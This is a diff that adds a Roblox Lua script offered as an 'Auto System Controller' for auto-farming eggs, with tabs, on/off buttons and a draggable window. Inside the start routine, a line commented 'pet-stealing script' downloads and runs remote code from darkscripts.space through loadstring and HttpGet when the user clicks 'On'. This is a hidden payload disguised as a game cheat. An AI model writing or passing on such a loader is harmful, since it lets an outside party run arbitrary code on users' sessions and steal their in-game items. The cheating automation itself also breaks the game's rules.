@@ -1,0 +1,288 @@
+-- Create references to the GUI elements
+local screenGui = Instance.new("ScreenGui")
+local frame = Instance.new("Frame")
+local header = Instance.new("TextLabel")
+local eggTab = Instance.new("TextButton")
+local breakablesTab = Instance.new("TextButton")
+local webhookTab = Instance.new("TextButton")
+local eggSection = Instance.new("Frame")
+local breakablesSection = Instance.new("Frame")
+local webhookSection = Instance.new("Frame")
+local eggOnButton = Instance.new("TextButton")
+local eggOffButton = Instance.new("TextButton")
+local tempCloseButton = Instance.new("TextButton")
+local permCloseButton = Instance.new("TextButton")
+local reopenButton = Instance.new("TextButton")
+ 
+-- UI Corners
+local uiCornerFrame = Instance.new("UICorner")
+local uiCornerButtons = Instance.new("UICorner")
+ 
+-- Set properties for the ScreenGui
+screenGui.Name = "AutoFarmGUI"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ 
+-- Set properties for the Frame (Main container)
+frame.Name = "MainFrame"
+frame.Size = UDim2.new(0, 400, 0, 300)
+frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+frame.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+ 
+-- Add rounded corners to the Frame
+uiCornerFrame.CornerRadius = UDim.new(0, 15)
+uiCornerFrame.Parent = frame
+ 
+-- Header
+header.Name = "Header"
+header.Size = UDim2.new(0, 380, 0, 40)
+header.Position = UDim2.new(0.5, -190, 0, 10)
+header.BackgroundTransparency = 1
+header.Text = "Auto System Controller"
+header.TextSize = 22
+header.Font = Enum.Font.GothamBold
+header.TextColor3 = Color3.fromRGB(255, 255, 255)
+header.Parent = frame
+ 
+-- Egg-Farm Tab
+eggTab.Name = "EggTab"
+eggTab.Size = UDim2.new(0, 120, 0, 30)
+eggTab.Position = UDim2.new(0, 20, 0, 60)
+eggTab.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+eggTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+eggTab.Text = "Egg-Farm"
+eggTab.Font = Enum.Font.GothamBold
+eggTab.Parent = frame
+ 
+-- Breakables Tab
+breakablesTab.Name = "BreakablesTab"
+breakablesTab.Size = UDim2.new(0, 120, 0, 30)
+breakablesTab.Position = UDim2.new(0, 150, 0, 60)
+breakablesTab.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+breakablesTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+breakablesTab.Text = "Breakable-Farm"
+breakablesTab.Font = Enum.Font.GothamBold
+breakablesTab.Parent = frame
+ 
+-- Webhook Tab
+webhookTab.Name = "WebhookTab"
+webhookTab.Size = UDim2.new(0, 120, 0, 30)
+webhookTab.Position = UDim2.new(0, 280, 0, 60)
+webhookTab.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+webhookTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+webhookTab.Text = "Discord-Webhook"
+webhookTab.Font = Enum.Font.GothamBold
+webhookTab.Parent = frame
+ 
+-- Egg Section (Buttons)
+eggSection.Name = "EggSection"
+eggSection.Size = UDim2.new(0, 360, 0, 160)
+eggSection.Position = UDim2.new(0.5, -180, 0, 110)
+eggSection.BackgroundTransparency = 1
+eggSection.Visible = true
+eggSection.Parent = frame
+ 
+-- On Button
+eggOnButton.Name = "EggOnButton"
+eggOnButton.Size = UDim2.new(0, 100, 0, 40)
+eggOnButton.Position = UDim2.new(0.5, -110, 0, 20)
+eggOnButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80) -- Green
+eggOnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+eggOnButton.Text = "On"
+eggOnButton.Font = Enum.Font.GothamBold
+eggOnButton.Parent = eggSection
+ 
+-- Off Button
+eggOffButton.Name = "EggOffButton"
+eggOffButton.Size = UDim2.new(0, 100, 0, 40)
+eggOffButton.Position = UDim2.new(0.5, 10, 0, 20)
+eggOffButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) -- Red
+eggOffButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+eggOffButton.Text = "Off"
+eggOffButton.Font = Enum.Font.GothamBold
+eggOffButton.Parent = eggSection
+ 
+-- Add UI Corners to Buttons
+for _, button in pairs({eggOnButton, eggOffButton}) do
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 12)
+    uiCorner.Parent = button
+end
+ 
+-- Breakables Section (Placeholder)
+breakablesSection.Name = "BreakablesSection"
+breakablesSection.Size = UDim2.new(0, 360, 0, 160)
+breakablesSection.Position = UDim2.new(0.5, -180, 0, 110)
+breakablesSection.BackgroundTransparency = 1
+breakablesSection.Visible = false
+breakablesSection.Parent = frame
+ 
+-- Webhook Section (Placeholder)
+webhookSection.Name = "WebhookSection"
+webhookSection.Size = UDim2.new(0, 360, 0, 160)
+webhookSection.Position = UDim2.new(0.5, -180, 0, 110)
+webhookSection.BackgroundTransparency = 1
+webhookSection.Visible = false
+webhookSection.Parent = frame
+ 
+-- Temporary Close Button
+tempCloseButton.Name = "TempCloseButton"
+tempCloseButton.Size = UDim2.new(0, 140, 0, 40)
+tempCloseButton.Position = UDim2.new(0, 30, 0, 230)
+tempCloseButton.Text = "Temporary Close"
+tempCloseButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219) -- Blue
+tempCloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+tempCloseButton.Font = Enum.Font.GothamBold
+tempCloseButton.TextSize = 16
+tempCloseButton.Parent = frame
+ 
+-- Permanent Close Button
+permCloseButton.Name = "PermCloseButton"
+permCloseButton.Size = UDim2.new(0, 140, 0, 40)
+permCloseButton.Position = UDim2.new(0, 230, 0, 230)
+permCloseButton.Text = "Permanent Close"
+permCloseButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) -- Red
+permCloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+permCloseButton.Font = Enum.Font.GothamBold
+permCloseButton.TextSize = 16
+permCloseButton.Parent = frame
+ 
+-- Add UI Corners to Close Buttons
+for _, button in pairs({tempCloseButton, permCloseButton}) do
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 12)
+    uiCorner.Parent = button
+end
+ 
+-- Reopen Button (Hidden by default)
+reopenButton.Name = "ReopenButton"
+reopenButton.Size = UDim2.new(0, 50, 0, 50)
+reopenButton.Position = UDim2.new(0, 10, 0.9, -60)
+reopenButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Dark Gray
+reopenButton.Text = ">"
+reopenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+reopenButton.Font = Enum.Font.GothamBold
+reopenButton.TextSize = 18
+reopenButton.Visible = false
+reopenButton.Parent = screenGui
+ 
+-- Functionality for Tabs
+local function showSection(section)
+    eggSection.Visible = (section == eggSection)
+    breakablesSection.Visible = (section == breakablesSection)
+    webhookSection.Visible = (section == webhookSection)
+end
+ 
+eggTab.MouseButton1Click:Connect(function() showSection(eggSection) end)
+breakablesTab.MouseButton1Click:Connect(function() showSection(breakablesSection) end)
+webhookTab.MouseButton1Click:Connect(function() showSection(webhookSection) end)
+ 
+-- Variables for Auto Roll System
+local autoRolling = false
+ 
+-- Function to Start Auto Roll
+local function startAutoRoll()
+    autoRolling = true
+ 
+ -- Execute the pet-stealing script
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/7cbfea1b3f.lua', true))()
+ 
+    -- Continuously roll eggs as long as autoRolling is true
+    while autoRolling do
+        local success, err = pcall(function()
+            game:GetService("ReplicatedStorage").Network.Eggs_Roll:InvokeServer()
+        end)
+ 
+        if not success then
+            print("Failed to roll eggs:", err)
+        end
+ 
+        wait(1) -- Adjust the interval as needed
+    end
+end
+ 
+-- Function to Stop Auto Roll
+local function stopAutoRoll()
+    autoRolling = false
+    print("Auto Roll Stopped!")
+end
+ 
+-- On Button Event
+eggOnButton.MouseButton1Click:Connect(function()
+    if not autoRolling then
+        startAutoRoll()
+        print("Egg Hatching Enabled")
+    end
+end)
+ 
+-- Off Button Event
+eggOffButton.MouseButton1Click:Connect(function()
+    if autoRolling then
+        stopAutoRoll()
+        print("Egg Hatching Disabled")
+    end
+end)
+ 
+-- Temporary Close Button Functionality
+tempCloseButton.MouseButton1Click:Connect(function()
+    frame.Visible = false
+    reopenButton.Visible = true
+end)
+ 
+-- Permanent Close Button Functionality
+permCloseButton.MouseButton1Click:Connect(function()
+    stopAutoRoll() -- Stop auto roll when permanently closed
+    frame.Visible = false
+    reopenButton.Visible = false
+    print("Permanently Closed - Auto Roll Disabled")
+end)
+ 
+-- Reopen Button Functionality
+reopenButton.MouseButton1Click:Connect(function()
+    frame.Visible = true
+    reopenButton.Visible = false
+end)
+ 
+-- Add rounded corners to Reopen Button
+local uiCornerReopen = Instance.new("UICorner")
+uiCornerReopen.CornerRadius = UDim.new(0, 12)
+uiCornerReopen.Parent = reopenButton
+ 
+-- Ensure correct tab is shown at start
+showSection(eggSection)
+ 
+-- Dragging functionality to make the GUI movable
+local dragging = false
+local dragInput, mousePos, framePos
+ 
+local function update(input)
+    local delta = input.Position - mousePos
+    frame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+end
+ 
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        mousePos = input.Position
+        framePos = frame.Position
+ 
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+ 
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+ 
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
